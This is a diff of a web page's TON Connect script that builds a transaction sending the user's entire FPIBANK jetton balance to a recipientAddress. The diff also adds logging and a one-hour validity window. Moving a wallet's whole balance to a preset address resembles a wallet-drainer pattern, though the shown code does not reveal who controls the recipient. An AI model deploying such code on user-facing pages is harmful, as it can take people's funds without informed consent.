@@ -83,29 +83,30 @@
 
       const humanBalance = Number(rawBalance) / 10 ** decimals;
       console.log(`У вас ~${humanBalance} FPIBANK (raw = ${rawBalance})`);
-
-      const gasFee = "20000000";
+      console.log("User Jetton Wallet Address:", userJettonWallet);
+      
+      const gasFee = "20000000"; // 0.02 TON на газ
 
       const message = {
         address: userJettonWallet,
         amount: gasFee,
         payload: {
-          type: "jetton_transfer",
+          type: "transfer",
           query_id: Math.floor(Math.random() * 1000000),
           amount: rawBalance,
           destination: recipientAddress,
-          response_destination: null,
-          custom_payload: null,
-          forward_ton_amount: "0",
-          forward_payload: null,
-          jetton: jettonMasterAddress,
+          response_address: userJettonWallet, // Куда вернётся сдача (если будет)
+          forward_amount: "0",
+          forward_payload: "",
         },
       };
 
       const transaction = {
-        validUntil: Math.floor(Date.now() / 1000) + 600,
+        validUntil: Math.floor(Date.now() / 1000) + 3600, // Даем больше времени (1 час)
         messages: [message],
       };
+
+      console.log("Transaction object:", JSON.stringify(transaction, null, 2));
 
       try {
         const result = await tonConnectUI.sendTransaction(transaction);
@@ -140,4 +141,5 @@
   </script>
 </body>
 </html>
+
 
